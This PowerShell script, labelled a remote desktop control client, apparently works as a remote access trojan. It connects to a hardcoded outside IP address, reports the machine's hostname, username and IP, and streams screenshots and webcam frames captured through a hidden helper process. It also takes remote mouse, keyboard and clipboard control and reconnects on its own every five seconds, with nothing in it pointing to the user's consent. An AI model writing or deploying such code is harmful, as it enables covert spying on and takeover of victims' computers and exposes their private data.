# Remote Desktop Control Client - PowerShell
$ServerIP = "144.172.88.250"
$ServerPort = 6000

Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32API {
    [DllImport("user32.dll")]
    public static extern void mouse_event(uint dwFlags, uint dx, uint dy, int dwData, int dwExtraInfo);
    [DllImport("user32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
    public const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
    public const uint MOUSEEVENTF_LEFTUP = 0x0004;
    public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
    public const uint MOUSEEVENTF_RIGHTUP = 0x0010;
    public const uint MOUSEEVENTF_WHEEL = 0x0800;
}
"@

$global:tcpClient = $null
$global:stream = $null
$global:running = $true
$global:streaming = $false
$global:cameraActive = $false
$global:hostname = $env:COMPUTERNAME
$global:username = $env:USERNAME
try {
    $global:localIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
        Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -ne "127.0.0.1"} |
        Select-Object -First 1).IPAddress
} catch {
    try {
        $global:localIP = ([System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME) |
            Where-Object {$_.AddressFamily -eq 'InterNetwork' -and $_.ToString() -ne '127.0.0.1'} |
            Select-Object -First 1).ToString()
    } catch { $global:localIP = "Unknown" }
}
$global:screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$global:screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
$global:camProcess = $null

function Send-Command {
    param([string]$CommandJSON)
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($CommandJSON + "`n")
        $global:stream.Write($bytes, 0, $bytes.Length)
        $global:stream.Flush()
        return $true
    } catch {
        Write-Host "[CLIENT] Error sending command: $_"
        return $false
    }
}

function Send-Screen {
    try {
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $imageBytes = $ms.ToArray()
        $graphics.Dispose(); $bitmap.Dispose(); $ms.Dispose()

        $cmd = @{type = "SCREEN"} | ConvertTo-Json -Compress
        if (-not (Send-Command $cmd)) { return $false }

        $lengthBytes = [BitConverter]::GetBytes([uint32]$imageBytes.Length)
        [Array]::Reverse($lengthBytes)
        $global:stream.Write($lengthBytes, 0, 4)
        $global:stream.Write($imageBytes, 0, $imageBytes.Length)
        $global:stream.Flush()
        return $true
    } catch {
        Write-Host "[CLIENT] Error sending screen: $_"
        return $false
    }
}

function Execute-MouseMove {
    param([int]$X, [int]$Y, [int]$CanvasWidth, [int]$CanvasHeight)
    $actualX = [Math]::Max(0, [Math]::Min([int](($X / $CanvasWidth) * $global:screenWidth), $global:screenWidth - 1))
    $actualY = [Math]::Max(0, [Math]::Min([int](($Y / $CanvasHeight) * $global:screenHeight), $global:screenHeight - 1))
    [Win32API]::SetCursorPos($actualX, $actualY)
}

function Execute-MouseClick {
    param([string]$Button, [int]$X, [int]$Y, [int]$CanvasWidth, [int]$CanvasHeight, [bool]$DoubleClick = $false)
    try {
        Execute-MouseMove -X $X -Y $Y -CanvasWidth $CanvasWidth -CanvasHeight $CanvasHeight
        Start-Sleep -Milliseconds 10
        $down = if ($Button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTDOWN } else { [Win32API]::MOUSEEVENTF_LEFTDOWN }
        $up = if ($Button -eq "right") { [Win32API]::MOUSEEVENTF_RIGHTUP } else { [Win32API]::MOUSEEVENTF_LEFTUP }
        $clicks = if ($DoubleClick) { 2 } else { 1 }
        for ($i = 0; $i -lt $clicks; $i++) {
            [Win32API]::mouse_event($down, 0, 0, 0, 0)
            Start-Sleep -Milliseconds 50
            [Win32API]::mouse_event($up, 0, 0, 0, 0)
            if ($DoubleClick -and $i -eq 0) { Start-Sleep -Milliseconds 50 }
        }
    } catch { Write-Host "[CLIENT] Error clicking mouse: $_" }
}

# ---- Webcam via Python OpenCV helper ----

function Start-Camera {
    try {
        $scriptDir = $null
        if ($PSScriptRoot) { $scriptDir = $PSScriptRoot }
        elseif ($MyInvocation.MyCommand.Path) { $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path }
        elseif ($MyInvocation.ScriptName) { $scriptDir = Split-Path -Parent $MyInvocation.ScriptName }
        if (-not $scriptDir) { $scriptDir = (Get-Location).Path }
        $helperPath = Join-Path $scriptDir "cam_helper.py"
        if (-not (Test-Path $helperPath)) { Write-Host "[CAMERA] cam_helper.py not found"; return }

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "python"
        $psi.Arguments = "`"$helperPath`""
        $psi.UseShellExecute = $false
        $psi.RedirectStandardInput = $true
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.CreateNoWindow = $true
        $global:camProcess = [System.Diagnostics.Process]::Start($psi)

        $readyBuf = New-Object byte[] 5
        $bytesRead = 0
        while ($bytesRead -lt 5) {
            $n = $global:camProcess.StandardOutput.BaseStream.Read($readyBuf, $bytesRead, 5 - $bytesRead)
            if ($n -le 0) { break }
            $bytesRead += $n
        }
        if ([System.Text.Encoding]::ASCII.GetString($readyBuf) -eq "READY") {
            $global:cameraActive = $true
            Send-Command (@{type = "CAMERA_FRAME"; status = "active"} | ConvertTo-Json -Compress)
        } else {
            if ($global:camProcess -and -not $global:camProcess.HasExited) { $global:camProcess.Kill() }
            $global:camProcess = $null
            $global:cameraActive = $false
        }
    } catch {
        Write-Host "[CLIENT] Error starting camera: $_"
        $global:cameraActive = $false
    }
}

function Send-CameraFrame {
    try {
        if (-not $global:cameraActive -or -not $global:camProcess -or $global:camProcess.HasExited) {
            $global:cameraActive = $false; return
        }
        $global:camProcess.StandardInput.WriteLine("CAPTURE")
        $global:camProcess.StandardInput.Flush()

        # Read 4-byte length
        $lenBuf = New-Object byte[] 4
        $bytesRead = 0
        while ($bytesRead -lt 4) {
            $n = $global:camProcess.StandardOutput.BaseStream.Read($lenBuf, $bytesRead, 4 - $bytesRead)
            if ($n -le 0) { return }
            $bytesRead += $n
        }
        [Array]::Reverse($lenBuf)
        $frameLen = [BitConverter]::ToUInt32($lenBuf, 0)
        if ($frameLen -eq 0 -or $frameLen -gt 5000000) { return }

        # Read JPEG bytes
        $jpegBuf = New-Object byte[] $frameLen
        $bytesRead = 0
        while ($bytesRead -lt $frameLen) {
            $n = $global:camProcess.StandardOutput.BaseStream.Read($jpegBuf, $bytesRead, $frameLen - $bytesRead)
            if ($n -le 0) { return }
            $bytesRead += $n
        }

        $cmd = @{type = "CAMERA_FRAME"} | ConvertTo-Json -Compress
        if (-not (Send-Command $cmd)) { $global:cameraActive = $false; return }
        $lengthBytes = [BitConverter]::GetBytes([uint32]$jpegBuf.Length)
        [Array]::Reverse($lengthBytes)
        $global:stream.Write($lengthBytes, 0, 4)
        $global:stream.Write($jpegBuf, 0, $jpegBuf.Length)
        $global:stream.Flush()
    } catch {
        Write-Host "[CAMERA] Error sending frame: $_"
        $global:cameraActive = $false
    }
}

function Stop-Camera {
    try {
        $global:cameraActive = $false
        if ($global:camProcess -and -not $global:camProcess.HasExited) {
            try {
                $global:camProcess.StandardInput.WriteLine("STOP")
                $global:camProcess.StandardInput.Flush()
                $global:camProcess.WaitForExit(2000)
            } catch {}
            if (-not $global:camProcess.HasExited) { $global:camProcess.Kill() }
        }
        $global:camProcess = $null
        Send-Command (@{type = "CAMERA_FRAME"; status = "inactive"} | ConvertTo-Json -Compress)
    } catch { Write-Host "[CLIENT] Error stopping camera: $_" }
}

function Read-Line {
    try {
        $bytes = New-Object System.Collections.Generic.List[byte]
        while ($true) {
            $byte = $global:stream.ReadByte()
            if ($byte -eq -1) { return $null }
            if ($byte -eq 10) { break }
            $bytes.Add($byte)
        }
        return [System.Text.Encoding]::UTF8.GetString($bytes.ToArray())
    } catch { return $null }
}

function Process-Command {
    param([string]$CommandJSON)
    try {
        $c = $CommandJSON | ConvertFrom-Json
        switch ($c.type) {
            "START_STREAM" { $global:streaming = $true }
            "STOP_STREAM"  { $global:streaming = $false }
            "MOUSE_MOVE" {
                Execute-MouseMove -X $c.x -Y $c.y -CanvasWidth $c.screen_width -CanvasHeight $c.screen_height
            }
            "MOUSE_DOWN" {
                Execute-MouseMove -X $c.x -Y $c.y -CanvasWidth $c.screen_width -CanvasHeight $c.screen_height
                Start-Sleep -Milliseconds 10
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
            }
            "MOUSE_UP" {
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
            }
            "MOUSE_CLICK" {
                Execute-MouseClick -Button $c.button -X $c.x -Y $c.y -CanvasWidth $c.screen_width -CanvasHeight $c.screen_height
            }
            "MOUSE_DOUBLE_CLICK" {
                Execute-MouseClick -Button $c.button -X $c.x -Y $c.y -CanvasWidth $c.screen_width -CanvasHeight $c.screen_height -DoubleClick $true
            }
            "KEYBOARD" {
                try { [System.Windows.Forms.SendKeys]::SendWait($c.key) }
                catch { Write-Host "[CLIENT] Keyboard error: $_" }
            }
            "MOUSE_SCROLL" {
                Execute-MouseMove -X $c.x -Y $c.y -CanvasWidth $c.screen_width -CanvasHeight $c.screen_height
                Start-Sleep -Milliseconds 10
                [Win32API]::mouse_event([Win32API]::MOUSEEVENTF_WHEEL, 0, 0, ($c.delta * 120), 0)
            }
            "CLIPBOARD_SET" {
                try { Set-Clipboard -Value $c.text }
                catch { Write-Host "[CLIENT] Clipboard error: $_" }
            }
            "CAMERA_ON"  { Start-Camera }
            "CAMERA_OFF" { Stop-Camera }
            "DISCONNECT" { $global:running = $false }
            "PING" { Send-Command (@{type = "PONG"} | ConvertTo-Json -Compress) }
            "HEARTBEAT" {
                Send-Command (@{type = "HEARTBEAT"; timestamp = [DateTime]::Now.ToString("o")} | ConvertTo-Json -Compress)
            }
        }
    } catch { Write-Host "[CLIENT] Error processing command: $_" }
}

function Start-Client {
    Write-Host "[CLIENT] Connecting to ${ServerIP}:${ServerPort}"
    try {
        $global:tcpClient = New-Object System.Net.Sockets.TcpClient
        $global:tcpClient.Connect($ServerIP, $ServerPort)
        $global:stream = $global:tcpClient.GetStream()
        $global:stream.ReadTimeout = 30000

        $identify = @{
            type = "IDENTIFY"; hostname = $global:hostname; username = $global:username
            ip = $global:localIP; version = "1.0"
            os_info = $(
                $build = [System.Environment]::OSVersion.Version.Build
                if ($build -ge 22000) { "Windows 11 (Build $build)" } else { "Windows 10 (Build $build)" }
            )
        } | ConvertTo-Json -Compress
        if (-not (Send-Command $identify)) { throw "Failed to send identification" }

        $lastScreen = [DateTime]::Now
        $lastCamera = [DateTime]::Now
        $lastHB = [DateTime]::Now

        while ($global:running) {
            $now = [DateTime]::Now
            if ($global:streaming -and ($now - $lastScreen).TotalMilliseconds -ge 250) {
                if (Send-Screen) { $lastScreen = $now }
                else { Start-Sleep -Milliseconds 100 }
            }
            if ($global:cameraActive -and ($now - $lastCamera).TotalMilliseconds -ge 500) {
                Send-CameraFrame; $lastCamera = $now
            }
            if (($now - $lastHB).TotalMilliseconds -ge 5000) {
                $hb = @{type = "HEARTBEAT"; timestamp = $now.ToString("o")} | ConvertTo-Json -Compress
                if (-not (Send-Command $hb)) { break }
                $lastHB = $now
            }
            if ($global:stream.DataAvailable) {
                $line = Read-Line
                if ($line) { Process-Command $line } else { break }
            }
            Start-Sleep -Milliseconds 50
        }
    } catch { Write-Host "[CLIENT] Error: $_" }
    finally {
        if ($global:stream) { $global:stream.Close() }
        if ($global:tcpClient) { $global:tcpClient.Close() }
    }
}

$null = Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { $global:running = $false }

try {
    Start-Client
    while ($true) {
        Write-Host "[CLIENT] Reconnecting in 5s..."
        Start-Sleep -Seconds 5
        $global:running = $true
        Start-Client
    }
} catch { Write-Host "[CLIENT] Fatal error: $_" }
